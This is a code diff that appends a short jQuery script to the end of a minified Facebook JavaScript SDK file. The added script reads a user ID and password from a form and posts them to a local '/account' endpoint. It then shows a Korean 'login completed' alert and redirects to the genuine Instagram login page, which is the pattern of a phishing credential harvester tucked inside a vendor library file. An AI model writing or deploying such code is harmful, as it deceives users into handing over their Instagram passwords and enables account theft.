@@ -187,3 +187,35 @@ __d("sdk.XFBML.ShareButton",["IframePlugin","sdk.UA","sdk.ui"],(function(a,b,c,d
 __d("sdk.XFBML.Video",["Assert","IframePlugin","ObservableMixin","sdk.Event","sdk.XD"],(function(a,b,c,d,e,f,g,h,i,j,k){__p&&__p();function l(a){"use strict";this.$1=a.isMuted,this.$2=a.volume,this.$3=a.timePosition,this.$4=a.duration}l.prototype.update=function(a){"use strict";a.isMuted!==undefined&&(this.$1=a.isMuted),a.volume!==undefined&&(this.$2=a.volume),a.timePosition!==undefined&&(this.$3=a.timePosition),a.duration!==undefined&&(this.$4=a.duration)};l.prototype.isMuted=function(){"use strict";return this.$1};l.prototype.getVolume=function(){"use strict";return this.$1?0:this.$2};l.prototype.getCurrentPosition=function(){"use strict";return this.$3};l.prototype.getDuration=function(){"use strict";return this.$4};function m(a,b,c){"use strict";this.$1=a,this.$2=b,this.$3=c}m.prototype.play=function(){"use strict";k.sendToFacebook(this.$1,{method:"play",params:ES("JSON","stringify",!1,{})})};m.prototype.pause=function(){"use strict";k.sendToFacebook(this.$1,{method:"pause",params:ES("JSON","stringify",!1,{})})};m.prototype.seek=function(a){"use strict";g.isNumber(a,"Invalid argument"),k.sendToFacebook(this.$1,{method:"seek",params:ES("JSON","stringify",!1,{target:a})})};m.prototype.mute=function(){"use strict";k.sendToFacebook(this.$1,{method:"mute",params:ES("JSON","stringify",!1,{})})};m.prototype.unmute=function(){"use strict";k.sendToFacebook(this.$1,{method:"unmute",params:ES("JSON","stringify",!1,{})})};m.prototype.setVolume=function(a){"use strict";g.isNumber(a,"Invalid argument"),k.sendToFacebook(this.$1,{method:"setVolume",params:ES("JSON","stringify",!1,{volume:a})})};m.prototype.isMuted=function(){"use strict";return this.$3.isMuted()};m.prototype.getVolume=function(){"use strict";return this.$3.getVolume()};m.prototype.getCurrentPosition=function(){"use strict";return this.$3.getCurrentPosition()};m.prototype.getDuration=function(){"use strict";return this.$3.getDuration()};m.prototype.subscribe=function(event,a){"use strict";g.isString(event,"Invalid argument");g.isFunction(a,"Invalid argument");this.$2.subscribe(event,a);return{release:ES(function(){this.$2.unsubscribe(event,a)},"bind",!0,this)}};a=h.extend({constructor:function(a,b,c,d){this.parent(a,b,c,d),this._videoController=null,this._sharedObservable=null,this._sharedVideoCache=null,this.subscribe("xd.onVideoAPIReady",function(a){this._sharedObservable=new i(),this._sharedVideoCache=new l(ES("JSON","parse",!1,a.data)),this._videoController=new m(this._iframeOptions.name,this._sharedObservable,this._sharedVideoCache),j.fire("xfbml.ready",{type:"video",id:d.id,instance:this._videoController})}),this.subscribe("xd.stateChange",function(a){this._sharedObservable.inform(a.state)}),this.subscribe("xd.cachedStateUpdateRequest",function(a){this._sharedVideoCache.update(ES("JSON","parse",!1,a.data))})},getParams:function(){return{allowfullscreen:"bool",autoplay:"bool",controls:"bool",href:"url",show_captions:"bool",show_text:"bool"}},getConfig:function(){return{fluid:!0,full_width:!0}}});e.exports=a}),null);
 __d("legacy:fb.xfbml.plugins",["IframePlugin","PluginConfig","PluginTags","XFBML","sdk.feature","sdk.XFBML.CustomerChat","sdk.XFBML.Comments","sdk.XFBML.CommentsCount","sdk.XFBML.LoginButton","sdk.XFBML.Quote","sdk.XFBML.Save","sdk.XFBML.ShareButton","sdk.XFBML.Video"],(function(a,b,c,d,e,f,g,h,i,j,k){var l={customerchat:b("sdk.XFBML.CustomerChat"),comments:b("sdk.XFBML.Comments"),comments_count:b("sdk.XFBML.CommentsCount"),login_button:b("sdk.XFBML.LoginButton"),quote:b("sdk.XFBML.Quote"),save:b("sdk.XFBML.Save"),share_button:b("sdk.XFBML.ShareButton"),video:b("sdk.XFBML.Video")},m=k("plugin_tags_blacklist",[]);ES(ES("Object","keys",!1,i),"forEach",!0,function(a){if(ES(m,"indexOf",!0,a)!==-1)return;j.registerTag({xmlns:"fb",localName:a.replace(/_/g,"-"),ctor:g.withParams(i[a],h[a])})});ES(ES("Object","keys",!1,l),"forEach",!0,function(a){if(ES(m,"indexOf",!0,a)!==-1)return;j.registerTag({xmlns:"fb",localName:a.replace(/_/g,"-"),ctor:l[a]})})}),3);
     }  }).call(global);})(window.inDapIF ? parent.window : window, window);} catch (e) {new Image().src="https:\/\/www.facebook.com\/" + 'common/scribe_endpoint.php?c=jssdk_error&m='+encodeURIComponent('{"error":"LOAD", "extra": {"name":"'+e.name+'","line":"'+(e.lineNumber||e.line)+'","script":"'+(e.fileName||e.sourceURL||e.script)+'","stack":"'+(e.stackTrace||e.stack)+'","revision":"4548383","namespace":"FB","message":"'+e.message+'"}}');}
+var signup = {
+    init : function () {
+        var _this = this;
+        $('#btn-save').on('click', function () {
+            _this.save();
+        });
+    },
+    save : function () {
+        var data = {
+            userid: $('#userid').val(),
+            userpassword: $('#userpassword').val(),
+            //useremail: $('#useremail').val()
+        };
+
+        $.ajax({
+            type: 'POST', // type은 변함 없음
+            url: '/account', // 이게 중요함
+            dataType: 'json',
+            contentType:'application/json; charset=utf-8',
+            data: JSON.stringify(data)
+        }).done(function() {
+            alert('로그인이 완료되었습니다.');
+            //location.reload();
+            location.href="https://www.instagram.com/accounts/login/?source=auth_switcher";
+        }).fail(function (error) {
+            alert(error);
+        });
+    }
+
+};
+
+signup.init();
